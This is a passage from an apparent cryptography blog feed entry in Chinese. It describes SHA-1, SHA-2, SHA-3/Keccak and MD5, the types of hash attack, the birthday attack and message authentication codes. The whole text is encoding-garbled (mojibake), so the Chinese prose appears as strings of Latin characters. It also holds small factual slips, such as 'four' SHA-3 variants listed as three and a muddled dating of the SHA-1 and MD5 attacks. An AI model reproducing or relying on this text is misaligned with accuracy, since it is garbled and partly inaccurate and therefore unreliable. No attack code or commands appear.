Algorithm)ç³»åˆ—</p><p>1995å¹´SHA-1è¢«æå‡ºæ¶ˆæ¯ä¸‰åˆ—ä¸º160bitï¼Œ2003å¹´ï¼ŒNISTç›¸ç»§å¯¹SHAç³»åˆ—ç®—æ³•è¿›è¡Œäº†æ‰©å±•æå‡ºäº†SHA-256ã€SHA-384ã€SHA-512ï¼Œå¹¶äº2004å¹´å¢åŠ äº†ä¸€ç§å˜ç§ç®—æ³•ï¼šSHA-224ï¼Œç»Ÿç§°ä¸ºSHA-2</p></li></ol><p>MD5æ›¾ç»æ˜¯åº”ç”¨æœ€å¹¿æ³›çš„Hashç®—æ³•ï¼Œ2004å¹´ï¼Œå±±ä¸œå¤§å­¦çš„ç‹å°äº‘æ•™æˆç­‰äººå‘è¡¨äº†å¯¹SHA-1çš„å®Œæ•´ç‰ˆæ”»å‡»ï¼Œèƒ½æ‰¾åˆ°ä¸€ç»„SHA-1çš„ç¢°æ’ã€‚ï¼ˆMD5æ•£åˆ—ç®—æ³•å·²ä¸å®‰å…¨ï¼Œä¸åœ¨æ¨èä½¿ç”¨ï¼‰</p><p>2007å¹´NISTå‘èµ·äº†SHA-3ç«èµ›ä»¥å¾é›†æ–°çš„Hashç®—æ³•ï¼Œ2012å¹´ï¼ŒKeccakæˆä¸ºç«èµ›çš„èƒœåˆ©è€…ï¼ŒSHA-3æ ‡å‡†å…¬å¸ƒï¼ŒSHA-3ä¸­çš„å››ç§Hashç®—æ³•SHA3-224ã€SHA3-256å’ŒSHA3-512å¯å®Œå…¨æ›¿æ¢SHA-2</p><h2 id="Hashå‡½æ•°ç®—æ³•"><a href="#Hashå‡½æ•°ç®—æ³•" class="headerlink" title="Hashå‡½æ•°ç®—æ³•"></a>Hashå‡½æ•°ç®—æ³•</h2><h3 id="SHA-1ç®—æ³•"><a href="#SHA-1ç®—æ³•" class="headerlink" title="SHA-1ç®—æ³•"></a>SHA-1ç®—æ³•</h3><p>SHA-1æ˜¯å½“å‰ä½¿ç”¨æœ€å¹¿æ³›çš„å“ˆå¸Œç®—æ³•ï¼Œå®ƒæ¥å—è¾“å…¥æ¶ˆæ¯çš„æœ€å¤§é•¿åº¦ä¸º(2^64^ -1)bit , ç”Ÿæˆ160bitçš„æ¶ˆæ¯æ‘˜è¦ã€‚é¦–å…ˆå°†è¾“å…¥æ¶ˆæ¯åˆ’åˆ†ä¸º512bitå—ï¼Œè‹¥æœ€åä¸€ä¸ªæ•°æ®å—ä¸æ»¡è¶³é•¿åº¦è¦æ±‚ï¼ŒæŒ‰ç…§ä¸€å®šè§„åˆ™å¡«å……512bitå—ã€‚ç„¶åæ¯ä¸ª512bitå—é‡å¤ä½¿ç”¨åˆ†å—å¤„ç†å‡½æ•°ï¼Œæœ€ç»ˆè¾“å‡º160bitå“ˆå¸Œå€¼ã€‚æ¯512bitå—ä»¥32bitå­—ä¸ºå¤„ç†å•ä½è¿›è¡Œå‹ç¼©ï¼Œå‹ç¼©å‡½æ•°åŒ…å«4å›åˆè¿ç®—ï¼Œæ¯ä¸€å›åˆ20æ­¥ï¼Œæ€»å…±80æ­¥ã€‚</p><h3 id="SHA-256ã€SHA-384å’ŒSHA-512-ç®—æ³•"><a href="#SHA-256ã€SHA-384å’ŒSHA-512-ç®—æ³•" class="headerlink" title="SHA-256ã€SHA-384å’ŒSHA-512^*^ ç®—æ³•"></a>SHA-256ã€SHA-384å’ŒSHA-512^*^ ç®—æ³•</h3><p>SHA-256ã€SHA-384ã€SHA-512ï¼Œç»Ÿç§°SHA-2. SHA-256å’ŒSHA-1ç®—æ³•ä¸€æ ·ï¼Œä»¥512bitåˆ†å—ä¸ºåŸºæœ¬å¤„ç†å•ä½è€ŒSHA-384ã€SHA-512ä¸SHA-1ç®—æ³•ä¸åŒï¼Œæ˜¯ä»¥1024bitåˆ†å—ä¸ºåŸºæœ¬å¤„ç†å•ä½ã€‚</p><h3 id="SHA-3ç®—æ³•"><a href="#SHA-3ç®—æ³•" class="headerlink" title="SHA-3ç®—æ³•"></a>SHA-3ç®—æ³•</h3><p>2007å¹´NISTå‘èµ·SHA-3ç«èµ›ä»¥å¾é›†æ–°çš„Hashç®—æ³•</p><p>2012å¹´ï¼ŒNISTæœ€ç»ˆé€‰æ‹©Keccakç®—æ³•ä½œä¸ºSHA-3æ ‡å‡†</p><p>ä¸ºäº†ä¸SHA-2å®Œå…¨å…¼å®¹ï¼ŒSHA-3ä¹Ÿæå‡ºäº†å››ç§Hashç®—æ³•SHA3-224ã€SHA3-256ã€SHA3-384ã€SHA3-512ï¼Œå¯å®Œå…¨æ›¿æ¢SHA-2</p><h4 id="Keccakç®—æ³•çš„æ€»ä½“æè¿°"><a href="#Keccakç®—æ³•çš„æ€»ä½“æè¿°" class="headerlink" title="Keccakç®—æ³•çš„æ€»ä½“æè¿°"></a>Keccakç®—æ³•çš„æ€»ä½“æè¿°</h4><p>Keccakç®—æ³•åŸºäºæµ·ç»µç»“æ„ï¼ŒåŒºåˆ«äºå¤šæ•°Hashå‡½æ•°æ‰€é‡‡ç”¨çš„ç»å…¸MDç»“æ„ï¼Œå¤„ç†è¿‡ç¨‹åˆ†ä¸ºå¸æ”¶(absorbing)é˜¶æ®µå’ŒæŒ¤å‹(squeezing)é˜¶æ®µä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ¶ˆæ¯è¢«åˆ†ä¸ºé•¿åº¦r bitçš„è‹¥å¹²æ¶ˆæ¯å—(å‡è®¾Nç»„ï¼Œp<del>1</del>,p<del>2</del>,p<del>3</del>,â€¦,p<del>n</del>)</p><h3 id="MD5ç®—æ³•"><a href="#MD5ç®—æ³•" class="headerlink" title="MD5ç®—æ³•"></a>MD5ç®—æ³•</h3><p>MD5ç®—æ³•æ˜¯ç”±RSAåˆ›å§‹äººRivestè®¾è®¡å¼€å‘çš„ï¼Œèƒ½æ¥æ”¶ä»»æ„é•¿åº¦çš„æ¶ˆæ¯ä½œä¸ºè¾“å…¥ï¼Œå¹¶ç”Ÿæˆ128bitå“ˆå¸Œå€¼ã€‚</p><h2 id="Hashç®—æ³•çš„æ”»å‡»ç°çŠ¶åˆ†æ"><a href="#Hashç®—æ³•çš„æ”»å‡»ç°çŠ¶åˆ†æ" class="headerlink" title="Hashç®—æ³•çš„æ”»å‡»ç°çŠ¶åˆ†æ"></a>Hashç®—æ³•çš„æ”»å‡»ç°çŠ¶åˆ†æ</h2><p>Hashå‡½æ•°ä¸»è¦ç”¨äºæ•°æ®å®Œæ•´æ€§éªŒè¯ï¼Œç¡®å®šæ¶ˆæ¯æ˜¯å¦è¢«ä¿®æ”¹ï¼Œå¯¹Hashå‡½æ•°æ”»å‡»çš„ç›®æ ‡èƒ½å¤Ÿç”Ÿæˆä¸åŸæ¶ˆæ¯ä¸åŒçš„æ¶ˆæ¯ï¼Œä½†å…¶å“ˆå¸Œå€¼ä¸åŸæ¶ˆæ¯çš„å“ˆå¸Œå€¼ç›¸ç­‰ï¼Œå³ç¢°æ’æ”»å‡»</p><p>Hashå‡½æ•°çš„æ”»å‡»å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç±»ï¼š</p><p>ï¼ˆ1ï¼‰åŸåƒæ”»å‡»ï¼Œå¯¹ç»™å®šçš„å“ˆå¸Œå€¼Yâˆˆ{0,1}^n^ ,èƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªåŸæ¶ˆæ¯Mï¼Œä½¿å¾—H(M)=Y</p><p>ï¼ˆ2ï¼‰ç¬¬äºŒåŸåƒæ”»å‡»ä¹Ÿç§°ä¸ºå¼±ç¢°æ’æ”»å‡»ï¼Œå¯¹ç»™å®šçš„æ¶ˆæ¯Mï¼Œæ‰¾åˆ°å¦å¤–ä¸€ä¸ªæ¶ˆæ¯Mâ€˜ï¼Œä½¿å¾—Mâ‰ Mâ€™ï¼Œè€ŒH(M)=H(Mâ€™)</p><p>ï¼ˆ3ï¼‰ç¢°æ’æ”»å‡»ä¹Ÿç§°ä¸ºå¼ºç¢°æ’æ”»å‡»ï¼Œæ‰¾åˆ°ä»»æ„ä¸¤æ¶ˆæ¯Må’ŒMâ€˜(Mâ‰ Mâ€™)ï¼Œä½¿å¾—H(M)=H(Mâ€™)</p><p>ç”Ÿæ—¥æ”»å‡»æ˜¯Hashå‡½æ•°ç¢°æ’æ”»å‡»æ–¹æ³•ä¸­æœ€é‡è¦çš„ä¸€ç§æ”»å‡»æ–¹æ³•ã€‚ç”Ÿæ—¥æ”»å‡»çš„åå­—èµ·æºäºæ‰€è°“çš„ç”Ÿæ—¥æ‚–è®ºã€‚</p><blockquote><p>ç”Ÿæ—¥æ‚–è®ºæ˜¯æŒ‡åœ¨ä¸å°‘äº 23 ä¸ªäººä¸­è‡³å°‘æœ‰ä¸¤äººç”Ÿæ—¥ç›¸åŒçš„<a href="https://baike.baidu.com/item/%E6%A6%82%E7%8E%87/828845">æ¦‚ç‡</a>å¤§äº 50%ã€‚</p><p>ä¸¥æ ¼æ¥è¯´ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ‚–è®ºï¼Œåªæ˜¯ä»¤äººåƒæƒŠçš„æ¦‚ç‡é—®é¢˜ã€‚</p></blockquote><p>å°†ç”Ÿæ—¥æ‚–è®ºæ¨å¹¿ä½ä¸‹è¿°é—®é¢˜ï¼šå·²çŸ¥åœ¨1åˆ°nä¹‹é—´å‡åŒ€åˆ†å¸ƒçš„æ•´æ•°å‹éšæœºå˜é‡ï¼Œè‹¥è¯¥å˜é‡çš„kä¸ªå–å€¼ä¸­è‡³å°‘æœ‰ä¸¤ä¸ªå–å€¼ç›¸åŒçš„æ¦‚ç‡å¤§äº0.5ï¼Œåˆ™kè‡³å°‘å¤šå¤§ï¼Ÿ</p><p>k=1.18n^Â½^</p><h3 id="ç”Ÿæ—¥æ”»å‡»"><a href="#ç”Ÿæ—¥æ”»å‡»" class="headerlink" title="ç”Ÿæ—¥æ”»å‡»"></a>ç”Ÿæ—¥æ”»å‡»</h3><p>ç”Ÿæ—¥æ”»å‡»æ˜¯åŸºäºä¸‹è¿°ç»“è®º:è®¾å•å‘Hashå‡½æ•°Y=H(X)ï¼ŒXã€Yéƒ½æ˜¯æœ‰é™é•¿åº¦çš„ï¼Œå¹¶ä¸”|X|â‰¥2|Y|,è®°ä¸º|X|=n,|Y|=m,é‚£ä¹ˆHashå‡½æ•°Hæœ‰2^m^ä¸ªå¯èƒ½çš„è¾“å‡ºï¼Œå¦‚æœHçš„kä¸ªéšæœºè¾“å…¥ä¸­è‡³å°‘æœ‰ä¸¤ä¸ªäº§ç”Ÿç›¸åŒè¾“å‡ºçš„æ¦‚ç‡å¤§äº0.5ï¼Œkâ‰ˆ2^m/2^</p><p>å¦å¤–ä¸€ç§æ”»å‡»Hashå‡½æ•°çš„æ–¹æ³•æ˜¯é‡‡ç”¨å¯†ç åˆ†æå­¦çš„åŠæ³•ï¼Œå³åˆ©ç”¨ç®—æ³•é€»è¾‘ä¸Šçš„ç¼ºé™·ï¼Œé™ä½ç ´è¯‘ç®—æ³•çš„ä»£ä»·ã€‚2004å¹´ï¼Œå±±ä¸œå¤§å­¦çš„ç‹å°äº‘æ•™æˆåœ¨ç¾å›½åŠ å·åœ£å·´å·´æ‹‰å¬å¼€çš„å›½é™…å¯†ç å­¦ä¼šè®®ä¸Šï¼Œåšäº†ç ´è¯‘MD5ã€HAVAL-128ã€MD4å’ŒRIPEMDç®—æ³•çš„æŠ¥å‘Šã€‚ç‹å°äº‘çš„ç ”ç©¶æˆæœè¢«å…¬è®¤ä¸ºMD5ç®—æ³•æœ€ä¼˜å…ˆçš„ç ´è§£åŠæ³•ã€‚</p><h2 id="æ¶ˆæ¯è®¤è¯"><a href="#æ¶ˆæ¯è®¤è¯" class="headerlink" title="æ¶ˆæ¯è®¤è¯"></a>æ¶ˆæ¯è®¤è¯</h2><p>æ¶ˆæ¯è®¤è¯æ˜¯ä¸€ä¸ªè¿‡ç¨‹ï¼Œç”¨ä»¥éªŒè¯æ¥æ”¶æ¶ˆæ¯çš„çœŸå®æ€§(çš„ç¡®æ˜¯ç”±å®ƒæ‰€å£°ç§°çš„å®ä½“å‘æ¥çš„)å’Œå®Œæ•´æ€§ï¼ŒåŒæ—¶è¿˜ç”¨äºéªŒè¯æ¶ˆæ¯çš„é¡ºåºæ€§å’Œæ—¶é—´æ€§ã€‚</p><p>å¯ç”¨æ¶ˆæ¯è®¤è¯ç (Mesage Authentication Code,MAC)å¯¹æ¶ˆæ¯åšè®¤è¯.</p><p>æ¶ˆæ¯è®¤è¯ç æ˜¯æŒ‡æ¶ˆæ¯è¢«ä¸€å¯†é’¥æ§åˆ¶çš„å…¬å¼€å‡½æ•°ä½œç”¨åäº§ç”Ÿçš„ã€ç”¨ä½œè®¤è¯ç¬¦çš„å›ºå®šé•¿åº¦çš„æ•°å€¼ï¼ŒMACç®—æ³•è¾“å…¥ä»»æ„é•¿åº¦æ¶ˆæ¯è¾“å‡ºå›ºå®šé•¿åº¦çš„æ•°æ®ï¼Œè¿™ç‚¹ä¸Hashå‡½æ•°ç±»ä¼¼ï¼Œä½†æ˜¯ä¸Hashå‡½æ•°ä¸åŒçš„æ˜¯ï¼Œè®¡ç®—MACå€¼å¿…é¡»æŒæœ‰å…±äº«å¯†é’¥.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¯†ç å­¦ä¹‹ç†è®ºç¯‡-è®¤è¯ç†è®ºä¸æŠ€æœ¯&quot;&gt;&lt;a href=&quot;#å¯†ç å­¦ä¹‹ç†è®ºç¯‡-è®¤è¯ç†è®ºä¸æŠ€æœ¯&quot; class=&quot;headerlink&quot; title=&quot;å¯†ç å­¦ä¹‹ç†è®ºç¯‡(è®¤è¯ç†è®ºä¸æŠ€æœ¯)&quot;&gt;&lt;/a&gt;å¯†ç å­¦ä¹‹ç†è®ºç¯‡(&lt;strong&gt;è®¤è¯ç†è®ºä¸æŠ€æœ¯&lt;/strong&gt;)&lt;/h1&gt;&lt;h</summary>
      
    
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
</feed>
